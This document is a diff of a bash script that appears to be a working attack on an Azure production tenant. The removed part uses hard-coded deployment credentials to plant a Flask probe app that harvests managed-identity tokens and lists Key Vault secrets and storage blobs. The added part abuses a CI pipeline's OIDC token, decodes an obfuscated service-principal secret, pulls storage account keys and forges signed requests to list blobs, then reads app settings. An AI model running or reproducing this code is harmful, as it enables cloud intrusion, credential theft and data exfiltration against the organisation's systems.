@@ -1,105 +1,113 @@
 #!/bin/bash
 set -e
 
-# SCM creds
-SCM_USER='$app-tbl-reporting-prod'
-SCM_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
-SCM_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"
+echo "=== PHASE 1: Tokens ==="
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
 
-# Upload new app.py via VFS
-APP_CODE='import os,json,urllib.request,urllib.error
-def http(url,h=None,t=20):
-    try:
-        r=urllib.request.urlopen(urllib.request.Request(url,headers=h or{}),timeout=t)
-        return r.status,r.read().decode("utf-8","replace")
-    except urllib.error.HTTPError as e:
-        return e.code,e.read().decode("utf-8","replace")[:2000]
-    except Exception as e:
-        return 0,str(e)
-from flask import Flask
-app=Flask(__name__)
-@app.route("/")
-def root():return "rg-probe-v4"
-@app.route("/e")
-def e():
-    out={}
-    ie=os.environ.get("IDENTITY_ENDPOINT","")
-    ih=os.environ.get("IDENTITY_HEADER","")
-    cid="7a85156a-01c4-4e61-8472-40a92107159b"
-    out["ie"]=ie;out["ih_len"]=len(ih)
-    for res,name in [("https://management.azure.com","mgmt"),("https://vault.azure.net","vault"),("https://storage.azure.com","storage")]:
-        u=f"{ie}?api-version=2019-08-01&resource={res}&client_id={cid}"
-        st,b=http(u,{"X-IDENTITY-HEADER":ih})
-        if st==200:
-            t=json.loads(b).get("access_token","")
-            out[f"{name}_len"]=len(t)
-            if name=="mgmt":
-                sub="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
-                mh={"Authorization":f"Bearer {t}"}
-                _,b2=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01",mh)
-                out["reporting_resources"]=b2[:3000]
-                _,b3=http(f"https://management.azure.com/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",mh)
-                out["rgs"]=b3[:1000]
-                _,b4=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",mh)
-                out["reporting_roles"]=b4[:2000]
-                _,b5=http(f"https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?\\$filter=principalId%20eq%20%27f64d08c7-fde6-4553-99c8-5bf73666ee8c%27&api-version=2022-04-01",mh)
-                out["mi_roles"]=b5[:1000]
-                # Check for resources in reporting RG
-                for rt in ["Microsoft.Storage/storageAccounts","Microsoft.KeyVault/vaults","Microsoft.Web/sites"]:
-                    _,b6=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/{rt}?api-version=2023-01-01",mh)
-                    out[f"rep_{rt.split('/')[-1]}"]=b6[:1000]
-            if name=="vault":
-                vh={"Authorization":f"Bearer {t}"}
-                _,b7=http("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",vh)
-                out["kv2_secrets"]=b7[:1000]
-            if name=="storage":
-                sh={"Authorization":f"Bearer {t}","x-ms-version":"2020-10-02"}
-                for a in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz"]:
-                    _,b8=http(f"https://{a}.blob.core.windows.net/?comp=list",sh)
-                    out[f"cont_{a[:10]}"]=b8[:500]
-                    for c in ["exports","config"]:
-                        _,b9=http(f"https://{a}.blob.core.windows.net/{c}?restype=container&comp=list",sh)
-                        if "Name" in b9:
-                            out[f"blob_{a[:10]}_{c}"]=b9[:1500]
-        else:
-            out[f"{name}_err"]=f"{st}:{b[:200]}"
-    return json.dumps(out,indent=1)
-if __name__=="__main__":
-    app.run(host="0.0.0.0",port=8000)
-'
+MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+  -d "scope=https://management.azure.com/.default" \
+  -d "grant_type=client_credentials" \
+  --data-urlencode "client_assertion=$OIDC" \
+  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r .access_token)
+echo "MGMT(cicd): ${MGMT:0:20}..."
 
-echo "=== UPLOAD ==="
-UPLOAD_CODE=$(echo -n "$APP_CODE" | base64 -w0)
-curl -sS -X PUT "$SCM_BASE/api/vfs/site/wwwroot/app.py" \
-  -u "$SCM_USER:$SCM_PASS" \
-  -H "If-Match: *" \
-  -H "Content-Type: application/octet-stream" \
-  --data-binary "$APP_CODE" -w "%{http_code}"
+SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
+SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
+
+SYNC_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+  -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
+  -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r .access_token)
+echo "MGMT(sync): ${SYNC_MGMT:0:20}..."
+
+SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+B="https://management.azure.com/subscriptions/$SUB"
+
 echo ""
+echo "=== PHASE 2: ALL Resource Groups ==="
+curl -sS "$B/resourcegroups?api-version=2021-04-01" \
+  -H "Authorization: Bearer $MGMT" | jq -r '.value[] | "\(.name) \(.location)"'
 
-# Trigger restart via process kill
-echo "=== RESTART ==="
-curl -sS -X POST "$SCM_BASE/api/command" \
-  -u "$SCM_USER:$SCM_PASS" \
-  -H "Content-Type: application/json" \
-  -d '{"command":"kill 1 2>/dev/null; echo done","dir":"/home"}' | jq -r '.Output // .Error'
+echo ""
+echo "=== PHASE 3: Resources in rg-tbl-reporting-prod-eus ==="
+curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" \
+  -H "Authorization: Bearer $MGMT" | jq '.value[] | {name, type, location}'
 
-sleep 20
+echo ""
+echo "=== PHASE 4: Role assignments - MI f64d08c7 ==="
+curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'&api-version=2022-04-01" \
+  -H "Authorization: Bearer $MGMT" | jq '.'
 
-# Fetch /e endpoint
-echo "=== PROBE ==="
-for i in 1 2 3 4 5; do
-  RESULT=$(curl -sS --max-time 30 "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>/dev/null)
-  if [ $? -eq 0 ] && [ -n "$RESULT" ]; then
-    echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
-    break
-  fi
-  echo "retry $i..."
-  sleep 10
+echo ""
+echo "=== PHASE 4b: ALL role assignments in reporting RG ==="
+curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MGMT" | jq '.value[] | {principalId: .properties.principalId, roleId: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}'
+
+echo ""
+echo "=== PHASE 5: Storage containers (mgmt API) ==="
+for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
+  echo "--- $SA ---"
+  for SVC in blobServices tableServices queueServices fileServices; do
+    ENDPOINT="$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA"
+    case $SVC in
+      blobServices) EP="$ENDPOINT/$SVC/default/containers" ;;
+      tableServices) EP="$ENDPOINT/$SVC/default/tables" ;;
+      queueServices) EP="$ENDPOINT/$SVC/default/queues" ;;
+      fileServices) EP="$ENDPOINT/$SVC/default/shares" ;;
+    esac
+    echo "  $SVC:"
+    curl -sS "$EP?api-version=2023-01-01" -H "Authorization: Bearer $MGMT" | jq -r '.value[]? | "    \(.name)"'
+  done
 done
 
-echo "=== CHECK ROOT ==="
-curl -sS --max-time 10 "https://app-tbl-reporting-prod.azurewebsites.net/"
+echo ""
+echo "=== PHASE 6: listKeys via sync-service ==="
+SA_KEYS=$(curl -sS -X POST "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" \
+  -H "Authorization: Bearer $SYNC_MGMT" -H "Content-Length: 0")
+SA_KEY=$(echo "$SA_KEYS" | jq -r '.keys[0].value')
+echo "Key obtained: ${SA_KEY:0:10}..."
+
+echo ""
+echo "=== PHASE 6b: Data plane - list ALL blobs ==="
+SA_NAME="sttblcilogsprodx3euoz"
+DATE=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
+STS="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE}\nx-ms-version:2023-01-03\n/${SA_NAME}/\ncomp:list"
+SIG=$(printf "%b" "$STS" | openssl dgst -sha256 -hmac "$(echo -n "$SA_KEY" | base64 -d)" -binary | base64 -w0)
+echo "Containers:"
+curl -sS "https://${SA_NAME}.blob.core.windows.net/?comp=list" \
+  -H "x-ms-date: $DATE" -H "x-ms-version: 2023-01-03" \
+  -H "Authorization: SharedKey ${SA_NAME}:${SIG}"
+
+sleep 1
+DATE3=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
+STS3="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE3}\nx-ms-version:2023-01-03\n/${SA_NAME}/logs\ncomp:list\nrestype:container"
+SIG3=$(printf "%b" "$STS3" | openssl dgst -sha256 -hmac "$(echo -n "$SA_KEY" | base64 -d)" -binary | base64 -w0)
+echo ""
+echo "Blobs in logs:"
+curl -sS "https://${SA_NAME}.blob.core.windows.net/logs?restype=container&comp=list" \
+  -H "x-ms-date: $DATE3" -H "x-ms-version: 2023-01-03" \
+  -H "Authorization: SharedKey ${SA_NAME}:${SIG3}"
+
+echo ""
+echo "=== PHASE 7: Restart reporting app ==="
+curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2023-01-01" \
+  -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" -o /dev/null -w "restart: %{http_code}"
+
+echo ""
+echo "=== PHASE 8: App settings ==="
+curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" \
+  -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" | jq '.'
+
+echo ""
+echo "=== PHASE 9: Storage in reporting RG ==="
+curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
+  -H "Authorization: Bearer $MGMT" | jq '.value[]? | {name, location}'
+
+echo ""
+echo "=== PHASE 10: KV in reporting RG ==="
+curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" \
+  -H "Authorization: Bearer $MGMT" | jq '.value[]? | {name, location, properties: .properties.vaultUri}'
 
 echo ""
 echo "=== DONE ==="
